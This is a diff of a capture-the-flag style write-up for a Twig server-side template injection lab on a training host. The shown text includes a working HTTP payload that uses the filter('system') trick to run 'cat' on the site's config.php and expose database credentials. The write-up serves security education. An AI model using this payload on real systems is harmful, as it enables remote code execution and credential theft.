@@ -1,9 +1,11 @@
 # Twig SSTI - true-scream.apac01.hackviser.space
 
 ## 🎯 Objective
+
 Exploit a Server-Side Template Injection vulnerability in the Twig template engine to execute system commands and retrieve sensitive configuration data.
 
 ## 🔍 Vulnerability Analysis
+
 - **Type:** Server-Side Template Injection (SSTI)
 - **Endpoint:** Search functionality
 - **Parameter:** `q`
@@ -11,6 +13,7 @@ Exploit a Server-Side Template Injection vulnerability in the Twig template engi
 - **Impact:** Remote code execution leading to database credential exposure
 
 ## 💥 Exploitation
+
 ```http
 GET /search?q={{['cat /var/www/html/config.php']|filter('system')}} HTTP/1.1
 Host: true-scream.apac01.hackviser.space
@@ -35,3 +38,4 @@ Configuration Analysis: Identifying sensitive data exposure vectors
 Filter Bypass: Utilizing built-in filters for malicious purposes
 
 Conducted in controlled environment for educational purposes
+```
